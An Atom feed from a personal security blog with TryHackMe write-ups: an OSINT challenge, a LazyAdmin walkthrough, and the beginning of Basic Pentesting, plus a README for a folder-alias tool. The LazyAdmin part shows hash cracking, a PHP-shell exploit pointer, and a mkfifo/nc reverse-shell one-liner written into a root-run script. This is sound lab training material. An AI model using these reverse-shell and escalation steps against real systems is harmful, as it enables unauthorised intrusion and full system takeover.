<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://akymos.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://akymos.io/" rel="alternate" type="text/html" /><updated>2023-04-30T13:52:16+00:00</updated><id>https://akymos.io/feed.xml</id><title type="html">Akymos.io</title><entry><title type="html">TryHackMe - OhSINT</title><link href="https://akymos.io/ctf/2023/04/30/ctf-ohsint.html" rel="alternate" type="text/html" title="TryHackMe - OhSINT" /><published>2023-04-30T12:45:00+00:00</published><updated>2023-04-30T12:45:00+00:00</updated><id>https://akymos.io/ctf/2023/04/30/ctf-ohsint</id><content type="html" xml:base="https://akymos.io/ctf/2023/04/30/ctf-ohsint.html"><![CDATA[<h1 id="room-info">Room info</h1>
<ul>
  <li><strong>Name</strong>: OhSINT</li>
  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/ohsint" target="_blank">https://tryhackme.com/room/ohsint</a></li>
  <li><strong>Subscription</strong>: Free</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Description</strong>: Are you able to use open source intelligence to solve this challenge?</li>
</ul>

<h2 id="questions">Questions</h2>
<ol>
  <li>What is this users avatar of?</li>
  <li>What city is this person in?</li>
  <li>Whats the SSID of the WAP he connected to?</li>
  <li>What is his personal email address?</li>
  <li>What site did you find his email address on?</li>
  <li>Where has he gone on holiday?</li>
  <li>What is this persons password?</li>
</ol>

<h2 id="task-file">Task file</h2>
<p><img src="/assets/images/ctf-ohsint/01.jpg" alt="OhSINT - Task file" class="post-image" /></p>

<h1 id="question-1---what-is-this-users-avatar-of">Question 1 - What is this users avatar of?</h1>
<p>As a jpg file is provided, we can use <code class="language-plaintext highlighter-rouge">exiftool</code> to get the metadata of the image.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>exiftool 1.jpg
ExifTool Version Number         : 12.57
File Name                       : WindowsXP.jpg
Directory                       : <span class="nb">.</span>
File Size                       : 234 kB
File Modification Date/Time     : 2023:04:30 12:49:04+02:00
File Access Date/Time           : 2023:04:30 12:50:18+02:00
File Inode Change Date/Time     : 2023:04:30 12:50:16+02:00
File Permissions                : <span class="nt">-rw-r--r--</span>
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 11.27
GPS Latitude                    : 54 deg 17<span class="s1">' 41.27" N
GPS Longitude                   : 2 deg 15'</span> 1.33<span class="s2">" W
Copyright                       : OWoodflint
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1080
Megapixels                      : 2.1
GPS Latitude Ref                : North
GPS Longitude Ref               : West
GPS Position                    : 54 deg 17' 41.27"</span> N, 2 deg 15<span class="s1">' 1.33" W
</span></code></pre></div></div>
<p>The copyright owner is: <code class="language-plaintext highlighter-rouge">OWoodflint</code> let’s search some information about him.
<img src="/assets/images/ctf-ohsint/02.png" alt="OhSINT - Google search" class="post-image" /></p>

<p>Based on the twitter account, we can see that the user avatar is a <code class="language-plaintext highlighter-rouge">cat</code>.</p>

<h1 id="question-2---what-city-is-this-person-in">Question 2 - What city is this person in?</h1>
<p><img src="/assets/images/ctf-ohsint/03.png" alt="OhSINT - User Tweet" />
Based on this tweet, we can see that the user Bssid is <code class="language-plaintext highlighter-rouge">B4:5D:50:AA:86:41</code> and using the website <a href="https://wigle.net/" target="_blank">wigle.net</a> we can get the location of the user starting from the Bssid.
<img src="/assets/images/ctf-ohsint/04.png" alt="OhSINT - Wigle search" /></p>

<p>So the answer is: <code class="language-plaintext highlighter-rouge">London</code></p>

<h1 id="question-3---whats-the-ssid-of-the-wap-he-connected-to">Question 3 - Whats the SSID of the WAP he connected to?</h1>
<p><img src="/assets/images/ctf-ohsint/05.png" alt="OhSINT - Wigle search" /></p>

<p>So the answer is: <code class="language-plaintext highlighter-rouge">UnileverWiFi</code></p>

<h1 id="question-4---what-is-his-personal-email-address">Question 4 - What is his personal email address?</h1>
<p>In the previous google search, we can see that the user has a github account.
The readme file of the repository contains the email address.
<img src="/assets/images/ctf-ohsint/06.png" alt="OhSINT - Github account" class="post-image" /></p>

<p>So the answer is: <code class="language-plaintext highlighter-rouge">OWoodflint@gmail.com</code></p>

<h1 id="question-5---what-site-did-you-find-his-email-address-on">Question 5 - What site did you find his email address on?</h1>
<p>Easy, the answer is: <code class="language-plaintext highlighter-rouge">GitHub</code></p>

<h1 id="question-6---where-has-he-gone-on-holiday">Question 6 - Where has he gone on holiday?</h1>
<p>Same google search, we can see that the user has a wordpress account.
The blog post contains the answer.
<img src="/assets/images/ctf-ohsint/07.png" alt="OhSINT - Wordpress account" class="post-image" /></p>

<p>So the answer is: <code class="language-plaintext highlighter-rouge">New York</code></p>

<h1 id="question-7---what-is-this-persons-password">Question 7 - What is this persons password?</h1>
<p>This one is tricky. After spending some time searching for the password, I decided to check the rss feed of the blog, to check if there is some post that I missed.
<img src="/assets/images/ctf-ohsint/08.png" alt="OhSINT - Wordpress account" class="post-image" />
And I found a part of text that I didn’t see in the blog post.</p>

<p>So the answer is: <code class="language-plaintext highlighter-rouge">pennYDr0pper.!</code></p>]]></content><author><name>akymos</name></author><category term="ctf" /><category term="ctf" /><category term="TryHackMe" /><summary type="html"><![CDATA[Room info Name: OhSINT Link: https://tryhackme.com/room/ohsint Subscription: Free Difficulty: Easy Description: Are you able to use open source intelligence to solve this challenge?]]></summary></entry><entry><title type="html">TryHackMe - LazyAdmin</title><link href="https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html" rel="alternate" type="text/html" title="TryHackMe - LazyAdmin" /><published>2023-04-23T17:24:00+00:00</published><updated>2023-04-23T17:24:00+00:00</updated><id>https://akymos.io/ctf/2023/04/23/ctf-lazyadmin</id><content type="html" xml:base="https://akymos.io/ctf/2023/04/23/ctf-lazyadmin.html"><![CDATA[<h1 id="room-info">Room info</h1>
<ul>
  <li><strong>Name</strong>: LazyAdmin</li>
  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/lazyadmin" target="_blank">https://tryhackme.com/room/lazyadmin</a></li>
  <li><strong>Subscription</strong>: Free</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Description</strong>: Easy linux machine to practice your skills</li>
</ul>

<h2 id="questions">Questions</h2>
<ol>
  <li>What is the user flag?</li>
  <li>What is the root flag?</li>
</ol>

<h1 id="step-0---recon">Step 0 - Recon</h1>
<h2 id="nmap">Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.26.136
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-24 21:28 CEST
Nmap scan report <span class="k">for </span>10.10.26.136
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 61846227c6c32917dd27459e29cb905e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>28.88 seconds
</code></pre></div></div>
<p>Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
<img src="/assets/images/ctf-lazyadmin/01.png" alt="LazyAdmin - Apache default page" class="post-image" /></p>

<h2 id="gobuster">Gobuster</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136 <span class="nt">-q</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/content              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
</code></pre></div></div>
<p>We have a ‘strange’ directory: <code class="language-plaintext highlighter-rouge">/content</code>. Let’s check it out.
<img src="/assets/images/ctf-lazyadmin/02.png" alt="LazyAdmin - /content directory" class="post-image" /></p>

<h2 id="gobuster-on-content">Gobuster on /content</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136/content <span class="nt">-q</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/_themes              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/_themes/]
/as                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/as/]
/attachment           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 325] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/attachment/]
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/images/]
/inc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/inc/]
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2198]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/js/]
</code></pre></div></div>
<p>Directory index is enabled. <code class="language-plaintext highlighter-rouge">/as</code> contains the admin panel of the website, but we don’t have any credentials (YET).
The directory <code class="language-plaintext highlighter-rouge">/inc</code> contains another folder: <code class="language-plaintext highlighter-rouge">/inc/mysql_backup</code>. Inside it, we have a file called <code class="language-plaintext highlighter-rouge">mysql_bakup_20191129023059-1.5.1.sql</code>. Let’s download it and check it out.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">return</span> <span class="k">array</span> <span class="p">(</span>
  <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'DROP TABLE IF EXISTS `%--%_attachment`;'</span><span class="p">,</span>
<span class="mf">......</span>
  <span class="mi">14</span> <span class="o">=&gt;</span> <span class="s1">'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&amp;#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\"Site close\\" to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');'</span><span class="p">,</span>
<span class="mf">......</span>
<span class="p">)</span> <span class="no">ENGINE</span><span class="o">=</span><span class="nc">MyISAM</span> <span class="k">DEFAULT</span> <span class="no">CHARSET</span><span class="o">=</span><span class="n">utf8</span><span class="p">;</span><span class="err">'</span><span class="p">,</span>
<span class="p">);</span><span class="cp">?&gt;</span>
</code></pre></div></div>
<p>We have found the credentials for the admin panel: <code class="language-plaintext highlighter-rouge">manager:42f749ade7f9e195bf475f37a44cafcb</code> (MD5 hash).</p>

<h2 id="john-the-ripper">John the Ripper</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>42f749ade7f9e195bf475f37a44cafcb <span class="o">&gt;</span> hash.txt <span class="o">&amp;&amp;</span> john <span class="nt">--format</span><span class="o">=</span>RAW-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="k">***********</span>      <span class="o">(</span>?<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-04-24 21:59<span class="o">)</span> 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s coco21..redlips
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>
<p>So the admin account is:</p>
<ul>
  <li>Username: <code class="language-plaintext highlighter-rouge">manager</code></li>
  <li>Password: <code class="language-plaintext highlighter-rouge">***********</code>
<img src="/assets/images/ctf-lazyadmin/03.png" alt="LazyAdmin - Admin panel" class="post-image" /></li>
</ul>

<h2 id="exploit">Exploit</h2>
<p>In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
<a href="https://www.exploit-db.com/exploits/40700" target="_blank">https://www.exploit-db.com/exploits/40700</a></p>

<h1 id="question-1---what-is-the-user-flag">Question 1 - What is the user flag?</h1>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="nv">$ </span><span class="nb">cat</span> /home/itguy/user.txt
THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
</code></pre></div></div>
<p>The user flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>

<h1 id="question-2---what-is-the-root-flag">Question 2 - What is the root flag?</h1>
<h2 id="privilege-escalation">Privilege escalation</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
Matching Defaults entries <span class="k">for </span>www-data on THM-Chal:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on THM-Chal:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
<span class="nv">$ </span><span class="nb">cat</span> /home/itguy/backup.pl
<span class="c">#!/usr/bin/perl</span>

system<span class="o">(</span><span class="s2">"sh"</span>, <span class="s2">"/etc/copy.sh"</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span> /etc/copy.sh
<span class="nt">-rw-r--rwx</span> 1 root root 81 Nov 29  2019 /etc/copy.sh
<span class="nv">$ </span><span class="nb">cat</span> /etc/copy.sh
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 192.168.0.190 5554 <span class="o">&gt;</span>/tmp/f

<span class="nv">$ </span><span class="c"># We can modify the file /etc/copy.sh</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.32.129 9002 &gt;/tmp/f"</span> <span class="o">&gt;</span> /etc/copy.sh
<span class="nv">$ </span><span class="nb">cat</span> /etc/copy.sh
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.8.32.129 9002 <span class="o">&gt;</span>/tmp/f

<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/perl /home/itguy/backup.pl
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9002
listening on <span class="o">[</span>any] 9002 ...
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cd /root</span>
<span class="c"># ls</span>
root.txt
<span class="c"># cat root.txt</span>
THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
</code></pre></div></div>
<p>The root flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>]]></content><author><name>akymos</name></author><category term="ctf" /><category term="ctf" /><category term="TryHackMe" /><summary type="html"><![CDATA[Room info Name: LazyAdmin Link: https://tryhackme.com/room/lazyadmin Subscription: Free Difficulty: Easy Description: Easy linux machine to practice your skills]]></summary></entry><entry><title type="html">Project ff</title><link href="https://akymos.io/project/2022/12/04/project-ff.html" rel="alternate" type="text/html" title="Project ff" /><published>2022-12-04T00:00:00+00:00</published><updated>2022-12-04T00:00:00+00:00</updated><id>https://akymos.io/project/2022/12/04/project-ff</id><content type="html" xml:base="https://akymos.io/project/2022/12/04/project-ff.html"><![CDATA[<p><img src="https://github.com/akymos/ff/actions/workflows/release.yml/badge.svg?branch=" alt="Release" />
<a href="https://goreportcard.com/report/github.com/akymos/ff"><img src="https://goreportcard.com/badge/github.com/akymos/ff" alt="Go Report Card" /></a></p>

<p>ff is a command-line tool to manage favorite folders, creating an alias, to be used via shell directly with the cd command.</p>

<p><a href="https://asciinema.org/a/UCxUx5TkKEUEitKyg8FEUZFCi"><img src="https://asciinema.org/a/UCxUx5TkKEUEitKyg8FEUZFCi.svg" alt="asciicast" /></a></p>

<h1 id="features">Features</h1>
<ul>
  <li>Quickly create the alias of the folder you are in.</li>
  <li>Manage many aliases (tested with 200+ aliases)</li>
  <li>In case of conflict between an alias and a directory present, gives priority to the second.</li>
  <li>Once you have created the alias you do not have to close the terminal to be able to use it immediately.</li>
</ul>

<h1 id="installation">Installation</h1>
<h2 id="prebuilt-binary">Prebuilt binary</h2>
<p>Download the prebuilt binary from <a href="https://github.com/akymos/ff/releases/latest">here (stable)</a> or <a href="https://github.com/akymos/ff/releases">here (all with pre-release)</a> and run the following command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-xf</span> &lt;prebuilt_archive&gt; ff <span class="o">&amp;&amp;</span> <span class="nb">sudo mv </span>ff /usr/local/bin
</code></pre></div></div>
<p>Next add the following line to <code class="language-plaintext highlighter-rouge">~/.zshrc</code> or <code class="language-plaintext highlighter-rouge">~/.bashrc</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">source</span> <span class="s2">"</span><span class="si">$(</span>ff <span class="nb">alias</span><span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>
<h2 id="update">Update</h2>
<p>To update the installed version of ff to the latest stable version, run the following command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ff self-update
</code></pre></div></div>

<h1 id="usage">Usage</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ff is a command-line tool to manage favorite folders, creating an <span class="nb">alias</span>,
to be used via shell directly with the <span class="nb">cd </span>command.

Usage:
  ff <span class="o">[</span><span class="nb">command</span><span class="o">]</span>

Examples:
<span class="nv">$ </span>ff add alias_name
<span class="nv">$ </span>ff add alias2 /tmp
<span class="nv">$ </span>ff update alias_name /var

Available Commands:
  add         Create a directory <span class="nb">alias
  alias       </span>Prints out the path to the <span class="nb">alias </span>file
  delete      Interactively allows you to delete an <span class="nb">alias
  </span>get         Return the raw path of an <span class="nb">alias
  help        </span>Help about any <span class="nb">command
  </span>list        List saved aliases
  panic       WARINING!! This delete all saved data
  self-update Update ff to the latest version
  update      Update a directory <span class="nb">alias

</span>Flags:
  <span class="nt">-h</span>, <span class="nt">--help</span>      <span class="nb">help </span><span class="k">for </span>ff
  <span class="nt">-v</span>, <span class="nt">--version</span>   version <span class="k">for </span>ff

Use <span class="s2">"ff [command] --help"</span> <span class="k">for </span>more information about a command.
</code></pre></div></div>

<h1 id="full-code">Full code</h1>
<p><a href="https://github.com/akymos/ff">GitHub</a></p>]]></content><author><name>Akymos</name></author><category term="project" /><category term="project" /><category term="ff" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">TryHackMe - Basic Pentesting</title><link href="https://akymos.io/ctf/2022/11/26/ctf-basic-pentesting.html" rel="alternate" type="text/html" title="TryHackMe - Basic Pentesting" /><published>2022-11-26T00:00:00+00:00</published><updated>2022-11-26T00:00:00+00:00</updated><id>https://akymos.io/ctf/2022/11/26/ctf-basic-pentesting</id><content type="html" xml:base="https://akymos.io/ctf/2022/11/26/ctf-basic-pentesting.html"><![CDATA[<h1 id="room-info">Room info</h1>
<ul>
  <li><strong>Name</strong>: Basic Pentesting</li>
  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/basicpentestingjt" target="_blank">https://tryhackme.com/room/basicpentestingjt</a></li>
  <li><strong>Subscription</strong>: Free</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Description</strong>: This is a machine that allows you to practise web app hacking and privilege escalation</li>
</ul>

<h2 id="questions">Questions</h2>
<ol>
  <li>Deploy the machine and connect to our network</li>
  <li>Find the services exposed by the machine</li>
  <li>What is the name of the hidden directory on the web server(enter name without /)?</li>
  <li>User brute-forcing to find the username &amp; password</li>
  <li>What is the username?</li>
  <li>What is the password?</li>
  <li>What service do you use to access the server(answer in abbreviation in all caps)?</li>
  <li>Enumerate the machine to find any vectors for privilege escalation</li>
  <li>What is the name of the other user you found(all lower case)?</li>
  <li>If you have found another user, what can you do with this information?</li>
  <li>What is the final password you obtain?</li>
</ol>

<h1 id="question-1---deploy-the-machine-and-connect-to-our-network">Question 1 - Deploy the machine and connect to our network</h1>
<p>No answer needed.</p>

<h1 id="question-2---find-the-services-exposed-by-the-machine">Question 2 - Find the services exposed by the machine</h1>
<p>No answer needed, but we can use <code class="language-plaintext highlighter-rouge">nmap</code> to find the services exposed by the machhine, usefull for the next questions.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.131.121 
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-30 14:46 CEST
Nmap scan report <span class="k">for </span>10.10.131.121 <span class="o">(</span>10.10.131.121<span class="o">)</span>
Host is up <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 994 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 db45cbbe4a8b71f8e93142aefff845e4 <span class="o">(</span>RSA<span class="o">)</span>
|   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a5682b225f984a62213da2e2c5a9f7c2 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
|_http-favicon: Apache Tomcat
| fingerprint-strings: 
|   DNSStatusRequestTCP, Help: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Sun, 30 Apr 2023 12:47:41 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
|_    Request&lt;/title&gt;&lt;style type="text/css"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;bod
|_http-title: Apache Tomcat/9.0.7
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=4/30%Time=644E636E%P=x86_64-pc-linux-gnu%r(DN
SF:SStatusRequestTCP,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/ht
SF:ml;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\
SF:r\nDate:\x20Sun,\x2030\x20Apr\x202023\x2012:47:41\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20
SF:type=\"text/css\"&gt;h1\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahom
SF:a,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;
SF:}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-
SF:color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:black;background-color:white;}\x20b\x20{font-family:Tahom
SF:a,Arial,sans-serif;color:white;background-color:#525D76;}\x20p\x20{font
SF:-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:
SF:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x2
SF:0{height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;bod"
